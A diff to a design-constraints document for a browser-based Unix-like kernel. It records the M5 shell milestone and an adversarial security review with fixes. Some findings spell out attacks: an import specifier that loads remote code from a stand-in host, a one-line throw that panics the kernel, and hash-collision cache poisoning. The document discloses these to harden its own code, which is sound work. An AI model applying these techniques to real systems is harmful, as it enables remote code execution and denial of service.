@@ -930,11 +930,317 @@ cancellation design.
     way to assert the thing (teardown's wake, which a finite timeout's own rescan would answer),
     the ORCHESTRATOR owns the deadline: it waits a bounded number of rounds, kills the stage, and
     reports `wokenByTeardown: false`. A check has to be able to fail, not wedge.
-123. **A program fetch MUST be bounded, because `spawn` cannot answer until it resolves.** The
-    kernel loads a program over HTTP (constraint 41: a process never fetches its own), and both
-    the page-driven batch and `SYS_spawn` await that load. An unbounded `fetch` therefore makes
-    process creation HANG rather than fail: the calling process is parked on a reply that never
-    comes, with no errno, nothing in the trace, and no way to tell a slow origin from a dead one.
+
+## M5 — the shell and ten programs
+
+123. **A process-supplied path reached `fetch`.** Until M5, `SYS_spawn` resolved its caller's path
+    with `new URL(path, self.location.href)` and fetched it — and `new URL` IGNORES the base for a
+    string carrying a scheme, so `spawn("https://elsewhere/x.mjs")` from any unprivileged process
+    made the kernel issue a request from the browser's network position and then EVALUATE the reply
+    as a program. That is both the SSRF primitive `src/kernel/providers.mjs` is written to deny —
+    "there is no path by which a process-supplied string becomes a request origin" — and arbitrary
+    remote code load, in the one call that creates processes. Closed by `src/kernel/exec.mjs`: a
+    program path is resolved through the mount table and the bytes come from the mount. The page's
+    own `t: "spawn"` keeps its URL, because the page is the supervisor and already holds the
+    kernel's whole surface. Asserted by `www/m5.html`'s `no_url` section over six spellings,
+    including `/src/bin/true.mjs` — a real file on the server that is NOT in this system's
+    filesystem, so a kernel that still reached the network would spawn that one and nothing else.
+124. **`/usr/bin` is rows in a manifest, not a special case.** `src/kernel/providerfs.mjs`'s
+    committed table gained eleven rows and nothing else changed: the mount name has no extension
+    and the provider path does, so `/usr/bin/ls` is a program and `src/bin/ls.mjs` is the file this
+    repository keeps it in. M3's own comment predicted this shape ("M5 puts ten programs in
+    `/usr/bin` by adding rows here, not by changing anything below") and it held.
+125. **A program's only linkable import is an ABSOLUTE specifier.** A program image is a Blob URL
+    with an opaque path, so a RELATIVE specifier inside it has no base to resolve against.
+    `bench/m4-fs/program.mjs` imported `"../../src/abi.mjs"`, which the page's URL-based loader
+    resolves and the filesystem loader cannot: left verbatim, the blob's import failed INSIDE the
+    child, so every stage of M4's pipelines faulted with SIGABRT, `/proc` said `never issued a
+    syscall`, and 23 expectations in an already-proved milestone went red with nothing anywhere
+    naming a specifier. `linkProgram` now REFUSES such a program with -ENOEXEC and a note carrying
+    the specifier. An absolute `/src/abi.mjs` works under both loaders and costs no fetch: it
+    resolves to the URL `src/libos/process.mjs` already has in its module map.
+126. **The exec loader's buffer is shared, so its reads are serialized.** A durable-volume program
+    is read through `Store.readFd` into ONE kernel-owned SAB registered with the I/O worker under a
+    negative view id. Two processes calling `SYS_spawn` in the same tick are two `later()` bodies
+    that interleave at every await, and both would read into offset 0: each would assemble a
+    mixture of the two programs and fail as a syntax error naming a line in neither file. A promise
+    chain in `makeExec` is the whole fix; the view id is negative so it cannot collide with a pid.
+127. **The image cache is content-addressed.** Keyed on FNV-1a of the bytes plus the length, never
+    on the path: a path key serves a stale image after the file behind it changes, which is exactly
+    what a shell writing a program and then running it does. Two programs with identical text share
+    one Blob and a rewritten program gets a new one, with no invalidation logic to get wrong.
+128. **`cd` needed a syscall; `getcwd` did not.** `slot.cwd` has existed since M2, was inherited at
+    spawn and was otherwise immovable, so `cd` was not expressible — and a shell whose working
+    directory cannot change is not a shell. `SYS_chdir` is 47, appended. There is deliberately no
+    `getcwd`: `/proc/<pid>/cwd` already publishes the answer through calls that exist, and
+    `src/bin/sh.mjs` reads it that way. The stored value is LEXICALLY normalized (`cd -L`), which
+    is what every shell does for its own working directory.
+129. **The exec check runs inside the filesystem that owns the file.** `openDecision` gained
+    `wantX` rather than the loader reading `mode & 0o111` itself, because `src/fs/vfs.mjs`'s `#may`
+    is the only thing that knows root ignores read and write but still needs an execute bit. A
+    check in the loader would have been a second permission model, and the two would have disagreed
+    about group ownership on the first file that had any. The generated filesystems check ANY
+    execute bit, and that is stated where it happens: their nodes own no uid or gid worth
+    consulting.
+130. **A shell must not die of the keystroke it forwards.** The line discipline raises SIGINT on the
+    terminal's foreground group; while the shell waits for a line that group is the shell's own, so
+    Ctrl-C at a prompt is delivered to it and at SIG_DFL it is fatal — measured, the shell was
+    reaped with `killed: true, code: 2` and the session ended on the first Ctrl-C. `SYS_sigaction`
+    had existed since M1 WITH NO CALLER ANYWHERE, so its three dispositions had never been
+    exercised from a process (constraint 100's rule). The shell sets SIGINT to SIG_HANDLE and
+    SIGQUIT/SIGTSTP to SIG_IGN. Dispositions are per process and are not inherited through `spawn`,
+    so a foreground pipeline still dies of Ctrl-C.
+131. **One signal costs TWO `-EINTR`s on this ABI.** `docs/ABI.md` decision 1 has the kernel do
+    both halves of delivery: it sets the SIGPEND bit AND interrupts the call in flight. So a Ctrl-C
+    at a prompt interrupts the parked `read` — the one the shell wants — and leaves the bit
+    pending, so the libos's entry check interrupts the NEXT call too before the exchange clears the
+    bits. Measured: without a retry, Ctrl-C printed no new prompt at all while the shell was
+    demonstrably alive and still read the next line. `src/bin/sh.mjs` retries the prompt write once,
+    and ONE retry is exactly enough because the entry check clears the bits it reports.
+    **THE KERNEL WAS NOT CHANGED INSTEAD, and that is a judgement rather than a conclusion.**
+    Clearing the bit when the kernel interrupts an in-flight call is arguably the right fix — the
+    interruption IS the delivery — but it moves a delivery rule that 332 existing expectations rest
+    on, and `drainSignals`'s `onsignal(bits)` hook would stop seeing a signal that reached a parked
+    process. A milestone that changes it owes M1's and M4b's signal proofs a re-run.
+132. **A shell prompts only when somebody is there to read it.** A shell whose stdin is a pipe or a
+    file is running a SCRIPT, and a prompt printed into its output stream becomes part of that
+    output: measured, `cd /usr/bin` then `pwd` down a pipe answered `~$ /usr/bin\n/usr/bin$ ` and
+    every proof that compared output failed on the decoration rather than on the result. `isatty(0)`
+    is `tty_get` answering ENOTTY, asked once at startup.
+133. **A pipeline missing its last stage used to RUN as its first.** `../webxp`'s parser carried a
+    comment claiming `ls |` was caught — it was not: the trailing empty stage is dropped before the
+    sweep that looks for one, so `stages` held only `ls` and the line ran. Caught by the host probe
+    (`bench/m5-sh/probe.mjs`, "an empty stage is refused") on its first run, and fixed with an
+    `awaitingStage` flag. A comment asserting a check exists is not evidence that it does —
+    constraint 104's rule, found again in ported code.
+134. **A filter must stream, or a pipeline with no end hangs.** `grep` was written with
+    `slurpText`, which waits for EOF — so `yes | grep y | head -1` would never print, because the
+    middle stage holds every byte until an end its writer will never send. `src/libos/std.mjs`
+    `eachLine` carries the buffering and `grep` stops reading on `-l`'s first hit, which is also
+    what lets the writer upstream see EPIPE. `cat` and `head` copy in pieces for the same reason;
+    `head`'s stopping is what makes M4's `yes | head -1` terminate through a real shell.
+135. **`f | g` with a builtin on either side is REFUSED, not deadlocked.** Constraint 20a's
+    casualty, named where a reader meets it: with no `fork` one Worker cannot be two stages, and
+    running them in sequence hangs the moment the first fills the 64 KiB pipe buffer. The refusal
+    names the stage and the reason. A second shell worker is the fix a later milestone can buy.
+136. **A negative control must subvert the SUBJECT, not the harness.** `spawn_self` returning the
+    caller's pid made EVERY section red — 7 of 8 — because the page's orchestrator spawns the shell
+    through the same call, so no shell ran at all and the control was satisfied by any failure. It
+    is now gated on `caller.ppid` being non-zero: the orchestrator has no parent and still starts
+    the shell, the shell has one, so only the shell's own stages go missing. And it is placed AFTER
+    the program loader, so every refusal still refuses — which is why `exec`'s four refusal rows are
+    in the HELD set while its two rows that need a child are not. Measured: 16 red, 18 intact.
+137. **A section written with a program in it cannot be in a control's HELD set.** The builtins
+    proof is deliberately program-free — `$$` is observed by `cd /proc/$$` and `$?` by the shell's
+    own exit status — because a `$$` proved with `echo $$` would have gone red under `spawn_self`
+    along with the pipelines and taken the control's specificity with it. The shape of a proof is
+    chosen for what the control must leave standing.
+138. **RECORDED LIMITATIONS of M5, sorted.**
+    *Permitted by decision:* no `&&`, `||`, `;`, subshells, functions, command substitution or
+    arithmetic — one pipeline per line, and `&&` and `;` are REFUSED rather than read as words
+    because `mkdir d && echo x` made four directories in the predecessor and reported success.
+    `grep`'s pattern is a FIXED STRING unless `-E`, because POSIX BRE is not JavaScript's syntax
+    and accepting JS regexes under a name that promises BRE is worse than refusing to pretend.
+    `ps` shows every process rather than POSIX's same-controlling-terminal set: there is one
+    session today, so the filter would be a no-op that reads as a feature.
+    *Structural:* `$VAR` holding `a b` is ONE argument — there is no `IFS` and no word splitting,
+    so quoting a variable changes nothing, which is the whole class of shell bug the convention
+    exists to prevent. `ls -l` prints no timestamp: the VFS keeps nanosecond times and there is no
+    `strftime` here, so the field is omitted rather than rendered in a format nothing else uses.
+    A program on the durable volume larger than 1 MiB is -EFBIG (`PROGRAM_MAX`).
+    *Defect, unfixed:* none known at the close of M5.
+
+## M5's adversarial review — what two critics found, and what it cost
+
+Each entry is a finding verified against the code before it was acted on. Two were given the
+artifact and the acceptance criteria and never the author's conclusion, as
+`~/.claude/rules/adversarial-review.md` requires; both found things the author was certain were
+fine, and the two worst defeated M5's own central claim.
+
+139. **THE FIX HAD MOVED THE HOLE, NOT CLOSED IT.** Constraint 123 says `SYS_spawn` no longer hands
+    a process-supplied path to `fetch`. It was true and it was not enough: the loader rewrote any
+    `/…`-shaped *import specifier* through `new URL(specifier, base)`, and `new URL` RESOLVES A
+    SCHEME-RELATIVE SPECIFIER OFF-ORIGIN. Measured against `http://localhost:8000/www/m5.html`:
+    `"//evil.example/p.mjs"` → `http://evil.example/p.mjs`, `"/\evil.example/p.mjs"` → the same (a
+    backslash is a slash to the URL parser), `"///x"` → `http://x/`, and `"/admin/whatever"` → an
+    arbitrary GET on the page's own origin. A bare `https://elsewhere/q.mjs` was not matched at all
+    and travelled into the Blob verbatim. Four syscalls from any process — write a program to
+    `/tmp` whose text says `import "//elsewhere/p.mjs"`, chmod it, spawn it — and the CHILD's module
+    loader fetched and evaluated remote code while **the kernel's own accounting stayed at zero
+    loads**, which is the worst property a security fix can have. COEP does not stop it: a module
+    script is fetched in CORS mode, so `Access-Control-Allow-Origin: *` satisfies CORP. Deleting
+    `fetch` in M6 will not stop it either — static `import` is the module loader, not `fetch`.
+    **Closed by an ALLOWLIST of exact literal specifiers** (`PROGRAM_IMPORTS`), compared by
+    equality, so no process-controlled string reaches `new URL` at all. `www/m5.html`'s `no_url`
+    section now asserts both halves over seven programs, with `/src/abi.mjs` as the positive
+    control so "everything was refused" cannot pass for a working allowlist.
+    **WHAT REMAINS OPEN:** a dynamic `import(expr)` whose argument is computed at run time cannot
+    be caught by reading the text, and no scanner can. The literal form is caught. The answer is a
+    Content-Security-Policy on the document, which bounds what the renderer will fetch whatever the
+    text says — M6 owns it, and it is the second half of constraint 41.
+140. **A four-line program panicked the whole kernel.** `src/libos/process.mjs`'s `self.onerror`
+    reported the fault and did not CANCEL the event, so the runtime re-fired it at the `Worker`
+    object in the parent — where the kernel's `worker.onerror` called `panic`, which stores K_PANIC
+    and tells every live process through its own SAB that the kernel is dead. A program containing
+    `setTimeout(() => { throw 0 })` therefore stopped the system. The wiring predates M5; what M5
+    changed is that a process now chooses its own program text, so it needed no cooperation from
+    the page. Fixed in both halves: the libos returns true to cancel, and a process worker's error
+    is reported as THAT PROCESS's fault and reaped as one. It earned itself immediately — the next
+    run named `ReferenceError: ensureStdin is not defined` in the shell instead of panicking.
+141. **The image cache was unbounded and collidable, and the two needed different fixes.**
+    *Unbounded:* `PROGRAM_MAX` caps one image and nothing capped their number, so a process
+    looping over "write a 1 MiB program with one byte varied, spawn it" retained a Blob and a blob
+    URL per turn — ~1 GiB after a thousand, and the renderer dies and takes every process with it.
+    Now bounded at `IMAGE_CACHE_BYTES` (8 MiB, ~47x all of `/usr/bin`) with eviction oldest-first
+    and `revokeObjectURL`, never evicting the entry the current load just made.
+    *Collidable:* FNV-1a-32 collides on demand — a meet-in-the-middle over four tail bytes, and the
+    critic produced a 38-byte file matching a real program's hash and length. The dangerous
+    direction is POISONING, not reuse: an unprivileged process execs its forgery once and a LATER
+    `spawn` of the real program, from any process including a root shell, runs the attacker's
+    bytes, with the mount, the permission check and the read all behaving correctly. Now a hit is
+    confirmed by COMPARING THE BYTES; the hash is reduced to an index.
+    `bench/m5-exec/controls.py` carries both halves as a two-stage control in M2's shape:
+    collapsing the key to a constant must move NOTHING (the comparison absorbs it), and collapsing
+    it *and* removing the comparison must move 17 — measured. If stage 1 passed either way the
+    comparison was testing nothing.
+142. **`exec` could splice two generations, and closing its description could publish another
+    process's un-fsynced bytes.** `readFd` takes the inode's lock PER CALL, so a two-chunk program
+    read interleaved by another process's `fsync` of the same file produced chunk 0 from generation
+    *n* and chunk 1 from *n+1* — a module that exists in no file, then hashed, cached and run.
+    Linux cannot reach this: the image is pinned and a write to a running executable is ETXTBSY.
+    Now the whole read runs inside one `withInode`, through `readHeld`.
+    And `closeFd` runs `commit(d)` on any non-read-only file description, where `commitOnce` with
+    nothing staged publishes the blob's PHYSICAL extent whenever it exceeds the metadata's size —
+    which is exactly where another description's outstanding append lives. So `spawn`, a read,
+    could publish a generation and append a journal record for a writer that never called `fsync`.
+    exec now gives back only what `openFd` took: `release(ino)` under the inode's lock, never
+    `closeFd`.
+143. **A quoted redirection target was still expanded, and `> '*'` truncated an unrelated file.**
+    `parse` kept only the target token's TEXT, so the shell rebuilt it as an unquoted word: `echo
+    hi > '*'` globbed, matched `notes.txt`, and opened it `O_TRUNC`. The user quoted `*` precisely
+    to mean a file called `*`. `> '$x'` and `> '%1'` were the same mistake in two other spellings.
+    `parse` now keeps the whole token.
+144. **Quoting was tracked per WORD, so `echo "$HOME"` printed `$HOME`.** One quoted character
+    suppressed every expansion across the word — measured: `ls "no"*` did not glob either — while
+    this file and `shlex.mjs`'s own header both claimed the opposite. A word is now a LIST OF SPANS,
+    each recording `bare` / `single` / `double`, which is what makes the three rules expressible at
+    all: variables expand in bare and double spans, globs are live only in bare ones, and nothing
+    expands in single ones. It also fixed 143's root cause and made `magic` honest — a `*` that
+    arrived from a variable's value is not re-read as a pattern.
+145. **A throw out of the redirection path left a stage parked in `write` forever.** An ambiguous
+    redirect, an unknown job spec or a bad substitution threw past BOTH the pipe-close loop and the
+    wait: `cat big | cat > '*'` left the shell holding the pipe's read end, so the first stage
+    filled 64 KiB, parked, and never got EPIPE — with no job row, so nothing could ever reap it and
+    no job spec could kill it. Every opened fd leaked with it, 1,021 occurrences exhausting
+    `OPEN_MAX`. Now the cleanup is a function that runs in a `finally`, the spawn loop is its own
+    function so no `break` can step past it, and expansion failures are error RETURNS.
+146. **A 4,096-byte line was split in half and both halves ran.** The read loop split one read on
+    newlines, justified by the terminal's canonical mode — but the same loop reads a SCRIPT, where
+    fd 0 is a pipe and there is no line discipline. Measured: a 4,090-byte first line made
+    `echo hello` into `echo h` plus `sh: ello: command not found`, and with a multi-byte character
+    at the seam the word `echo` itself was torn and both halves ran. Silent wrong execution. The
+    loop now carries the partial tail between reads with a streaming decoder, and runs an
+    unterminated final line at end of input.
+147. **`%1` had no unambiguous spelling until it expanded to TWO words.** A job spec expanding to
+    the positive leader pid signalled one stage, so `sleep 60 | sleep 60 &` then `kill %1` left the
+    second stage running for its full minute with nothing able to reach it. Expanding to `-pgid`
+    instead made `kill %1` into `kill -3`, and `kill` reads a leading `-<digits>` as a signal —
+    POSIX's obsolescent form — so the call answered `usage:` with signal 3 consumed and no target.
+    **Pids here start at 1, so a job's group is routinely a number that is also a signal:** the
+    ambiguity is the common case, not a corner. A job spec now expands to `--` and the negative
+    group, which is the one spelling `kill` cannot misread, and `kill` needed nothing added for it
+    beyond POSIX's own end-of-options. A spec is also a WHOLE WORD or it is literal, so
+    `cat /tmp/a%20b` is a path again.
+148. **`/dev/zero` is 256 bytes, so a `-c` shell with no stdin fed 256 NULs to every reader.**
+    `ensureStdin` opened it to hold fd 0 — which it does — but `sh -c "wc -c"` then printed 256
+    where it must print 0. `/dev/null` is in the same directory, is 0 bytes, and means what the
+    function needed.
+149. **The kernel advertised nine signals it could not honour.** `signalOf` accepts STOP, TSTP,
+    TTIN, TTOU, CONT, QUIT, ILL, ABRT and SEGV; `FATAL_DEFAULT` held four rows. So `kill -ABRT
+    <pid>` returned 0, the target's blocked `read` answered -EINTR, `drainSignals` discarded the
+    bit and the process KEPT RUNNING, where POSIX's default for each is to terminate. Adding `kill`
+    made the gap a public surface — `kill -l` prints the whole table. QUIT, ABRT, ILL and SEGV are
+    now fatal by default. **STOP, TSTP, TTIN, TTOU and CONT remain accepted and inert**, because
+    there is no stopped state in this kernel to put a process into; that is a feature, not a fix,
+    and it is recorded here rather than left as a name that is accepted and ignored.
+150. **Smaller, each with its own fix:** `wantX` + `create` created a file and skipped the execute
+    check, contradicting its own comment (now ENOENT, as promised); `chdir` answered EACCES for a
+    non-executable file and ENOTDIR for the same mistake on a generated mount, because the
+    permission check ran before the type check (now type first, so the `-ENOTDIR` line is
+    reachable); a failed `dup` in a redirected builtin CLOSED the shell's stdout, after which
+    `pipe2` handed out fd 1 as a pipe end (now the save is checked and the redirection refused);
+    `wait $!` was a silent no-op for a multi-stage job because it matched only pgids (now pid or
+    pgid); a backgrounded builtin answered `command not found`, exit 127 (now refused with a
+    reason, exit 2); a `UsageError` from EXPANSION was reported as a defect in the shell with a
+    stack trace and exit 70 (now a usage error, exit 2); `ls` stripped trailing whitespace off the
+    last column, so a file named `"  "` printed as a blank line; `ps` discarded its operands and
+    exited 0 for `ps 123`; `head -n` with no argument said "use -n n"; and `sleep 0.0000000001`
+    rounded to a zero-nanosecond sleep, the exact value constraint 100's note records as having
+    cost two proofs.
+151. **`head -1` had to be supported, not refused.** It was refused as an obsolescent form this
+    program does not carry — and MILESTONES.md M5's own headline proof is written `yes | head -1`,
+    so the first thing anybody typed hit the refusal. A program may not refuse the spelling its
+    own acceptance criterion uses.
+152. **The property four programs were written around had no spelling in this system.** `cat`,
+    `head`, `grep` and `std.eachLine` all stream rather than slurp, and every one cites
+    `yes | head -1` as the reason — a case no check could reach, because there was no endless
+    source: `/dev/zero` is an honest finite 256-byte file. `yes` is the eleventh program where the
+    milestone asked for ten, and it is what makes M4's headline proof sayable in shell. A comment
+    citing a case the system cannot express is a comment nobody can check.
+153. **M5 shows constraint 121's flake too, and it fails closed.** `--negative spawn-self` reported
+    "39 expectation(s) about the control itself unmet" ONCE in the eight runs taken while M5 was
+    being closed. The signature is constraint 121's exactly: the page comes out BROKEN with zero
+    labels recorded, so every declared label reads as "recorded no expectation by that name" and
+    the gate counts one problem per label plus the outcome. Both times it was a full-suite negative
+    run started shortly after a previous Chrome; `--only m5` passed 3 of 3 and the full phase
+    passed on the next attempt. THE CAUSE IS NOW IDENTIFIED — constraint 155: a per-kernel-boot
+    stall, 0 in 360 boots idle against 3 in 540 under contention, which a page booting one kernel
+    per proof meets once per kernel. The property that matters was unchanged throughout: **a run that could not be measured is reported as BROKEN,
+    never as a pass**. Treat a single red here as unmeasured and re-run it alone, with Chrome given
+    time to exit — `pkill` returns before it is gone.
+154. **Findings the review returned that were ANSWERED rather than fixed**, each with the reason —
+    `~/.claude/rules/adversarial-review.md` requires a confirmed finding to be one or the other,
+    never left unaddressed and unmentioned.
+    - **`exec` requires READ permission as well as execute**, so a `--x` program is refused where
+      Linux would run it. KEPT: this kernel has to read the program text to run it — there is no
+      loader that can execute bytes it cannot see — so read permission is genuinely required rather
+      than incidentally demanded. For uid 0, `#may` ignores the read bit anyway.
+    - **`chdir` puts no ceiling on the stored cwd**, so `mkdir a; cd a` in a loop grows `p.cwd`
+      without bound and every later path call of that process pays `joinPath` + `normalize` over it
+      ON THE KERNEL THREAD (constraint 56 gives the kernel 200 ms before parked processes declare
+      it dead). KEPT: Linux is equally unbounded here, the growth is linear in syscalls the process
+      made, and a ceiling would be a number with no source. Named so the next reader of constraint
+      56 knows where to look.
+    - **The exec gate has no timeout**, so a `store` operation that never settles wedges every
+      FUTURE exec in the system rather than only its own. KEPT: nothing in `store` can fail to
+      settle — `iocore.request` wraps everything and returns an errno — so a hang there is already
+      a kernel defect, and a timeout would answer it by running two program reads into one shared
+      buffer, which is the thing the gate exists to prevent.
+    - **`SynthFS` checks ANY execute bit** where the VFS checks the triad for the caller's
+      credential. KEPT and recorded at the line (constraint 129): generated nodes own no uid or gid
+      worth consulting, every one of them is served 0o555 or 0o444, so the two models agree on
+      every file that exists. The divergence is latent and it over-grants, which is why it is
+      written down rather than left to be discovered.
+    - **`env.write` can return a SHORT count and every program tests only `< 0`.** A sink that
+      accepted part of a write would drop output and report exit 0. KEPT as a recorded shape: the
+      critic could not reach it — a full pipe parks rather than short-counting, and
+      `src/libos/syscall.mjs`'s `write` already loops — so there is no caller to fix and no check
+      that could fail. The address is `src/libos/std.mjs`'s `out`, and the fix if it ever becomes
+      reachable is a loop there rather than in eleven programs.
+    - **`ps` joins argv with spaces**, so `sh -c "echo a b"` renders as `sh -c echo a b` and an
+      argument containing a space is indistinguishable from two arguments. KEPT: `/proc/<pid>/cmdline`
+      is NUL-separated and carries the information, so a reader that needs it has it; quoting in
+      `ps` output is a convention this system has no need to pick yet.
+## What root-causing m4b's intermittent BROKEN found
+
+These are not M5's. They come from the investigation of the flake constraint 121 recorded and
+could not explain, which is answered in 153 above.
+
+155. **A program fetch MUST be bounded, because `spawn` cannot answer until it resolves.** The
+    kernel loads a program over HTTP (constraint 41: a process never fetches its own), and the
+    caller cannot be answered until that load resolves. An unbounded `fetch` therefore makes
+    process creation HANG rather than fail: the caller waits on a reply that never comes, with no
+    errno, nothing in the trace, and no way to tell a slow origin from a dead one.
     `programImage` now fetches under a 5 s deadline through `AbortController` — not a racing
     timer, which would leave the original request outstanding — and retries once, because the
     stall it was written for is transient. `programFetchTimeouts` and `programFetchRetries` are
@@ -944,9 +1250,16 @@ cancellation design.
     signals, one trivial process each. **0 stalls in 360 boots idle; 3 in 540 under threefold
     contention, 0.56% per boot**, two of them on exactly this await. At that rate a page booting
     thirteen kernels fails about 1 run in 14, which is what `www/m4b.html` was doing at 1 in 12.
-124. **`www/m4b.html`'s intermittent BROKEN is exposure, not a defect in what it tests.** It is
+    M5 CHANGED THE SCOPE OF THIS, and the bound is still right. `SYS_spawn` no longer fetches at
+    all: `src/kernel/exec.mjs` resolves a program through the mount table and reads the bytes from
+    the mount (constraint 123), so a PROCESS can no longer hang on a stalled fetch. What
+    `programImage` still serves is the page's own `t: "spawn"` — the supervisor path every bench
+    page and `www/m4b.html` boot through — and that is where the measured stall was. The two changes
+    close the same hole from opposite ends: M5 removed the process's access to the network, and this
+    bounds what remains.
+156. **`www/m4b.html`'s intermittent BROKEN is exposure, not a defect in what it tests.** It is
     the only check that boots one kernel per proof — thirteen per run, where every other check
-    boots one — so it meets constraint 123's per-boot risk thirteen times. The stall is in the
+    boots one — so it meets constraint 155's per-boot risk thirteen times. The stall is in the
     page-to-kernel bootstrap, before any behaviour under test, and it fails CLOSED: the harness
     reports a run it could not measure, never a pass. Ruled out by measurement before this was
     found, each recorded so nobody re-runs them: the proof count (11 vs 13, unchanged), orphaned
@@ -955,6 +1268,13 @@ cancellation design.
     unchanged, and zero listen-queue overflows in `netstat -s -p tcp`), and truncated modules from
     the byte-range server (`bench/kernel-churn/rangetest.py`: eight range forms byte-exact, four
     malformed forms refused).
+    THE LISTEN BACKLOG IS RULED OUT FOR THIS PATH AND NOT IN GENERAL, which matters because the
+    comment above `programImage` records the opposite result for a different one: 16 processes
+    importing one URL AT THE SAME INSTANT lost 6 of 480 connections to `socketserver`'s backlog of
+    5. Both measurements stand. A burst of sixteen simultaneous connections can overflow a backlog
+    of five; thirteen kernel boots taken one after another cannot, and `netstat -s -p tcp` recorded
+    zero listen-queue overflows throughout. Concurrency profile is the variable, so neither result
+    generalises to the other's shape.
     AND "LOAD" MEANS MEMORY. The contention figure was taken with `sysctl vm.swapusage` reading
     10.6 GB of 11.3 GB used and 64 MB of free RAM — the developer's own browsers, not the harness.
     Under that pressure `--only m1` was KILLED mid-run — the shell's own exit line never reached
